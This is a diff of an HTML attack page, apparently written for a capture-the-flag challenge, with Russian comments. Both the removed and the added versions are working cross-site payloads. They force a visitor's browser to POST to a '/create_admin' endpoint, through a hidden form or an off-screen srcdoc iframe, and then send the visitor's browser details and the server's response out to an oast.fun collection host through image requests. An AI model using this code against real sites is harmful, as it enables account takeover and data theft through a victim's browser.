@@ -1,57 +1,57 @@
 <!DOCTYPE html>
 <html>
 <body>
-<iframe id="sink" name="sink" style="display:none"></iframe>
-
 <script>
-(async () => {
-  const OAST = "https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun";
+// Создаем iframe с кодом, который сделает запрос С ТОГО ЖЕ ORIGIN
+const iframe = document.createElement('iframe');
+iframe.style.cssText = 'width:0;height:0;border:0;position:absolute;left:-9999px;';
 
-  function exfil(tag, data) {
-    const enc = btoa(unescape(encodeURIComponent(data)));
-    new Image().src = `${OAST}/${tag}?d=${encodeURIComponent(enc)}`;
-  }
+// ВАЖНО: srcdoc создает страницу с origin about:srcdoc или null
+// Некоторые браузеры разрешают доступ из такого iframe
+iframe.srcdoc = `
+<!DOCTYPE html>
+<html>
+<head>
+    <base href="https://tasks.goidactf.ru:20246/">
+</head>
+<body>
+    <script>
+        // Этот код выполняется в контексте iframe
+        fetch('/create_admin', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+            body: 'new_admin_login=srcdoc_test'
+        })
+        .then(r => r.text())
+        .then(text => {
+            // Отправляем результат родителю
+            window.parent.postMessage({
+                type: 'admin_response',
+                data: text.substring(0, 300)
+            }, '*');
+        })
+        .catch(e => {
+            window.parent.postMessage({
+                type: 'error',
+                data: e.toString()
+            }, '*');
+        });
+    <\/script>
+</body>
+</html>
+`;
 
-  /* 1️⃣ инфа о боте */
-  exfil("bot",
-    JSON.stringify({
-      ua: navigator.userAgent,
-      lang: navigator.language,
-      time: new Date().toISOString(),
-      url: location.href
-    })
-  );
-
-  /* 2️⃣ POST create_admin через iframe */
-  const form = document.createElement("form");
-  form.method = "POST";
-  form.action = "https://tasks.goidactf.ru:20246/create_admin";
-  form.target = "sink";
-
-  const input = document.createElement("input");
-  input.type = "hidden";
-  input.name = "new_admin_login";
-  input.value = "ctfadmin_" + Date.now();
-
-  form.appendChild(input);
-  document.body.appendChild(form);
-  form.submit();
-
-  exfil("state", "form_submitted");
-
-  /* 3️⃣ пробуем прочитать ответ */
-  setTimeout(() => {
-    try {
-      const frame = document.getElementById("sink");
-      const doc = frame.contentDocument || frame.contentWindow.document;
-      const body = doc?.body?.innerText || "EMPTY_BODY";
-      exfil("response", body);
-    } catch (e) {
-      exfil("error", e.toString());
+// Слушаем сообщения от iframe
+window.addEventListener('message', (event) => {
+    if (event.data && event.data.type) {
+        // Отправляем на webhook
+        const encoded = btoa(JSON.stringify(event.data)).substring(0, 40);
+        new Image().src = `https://msg-${encoded}.zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/`;
     }
-  }, 2000);
+});
 
-})();
+document.body.appendChild(iframe);
+new Image().src = 'https://srcdoc-loaded.zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/';
 </script>
 </body>
 </html>
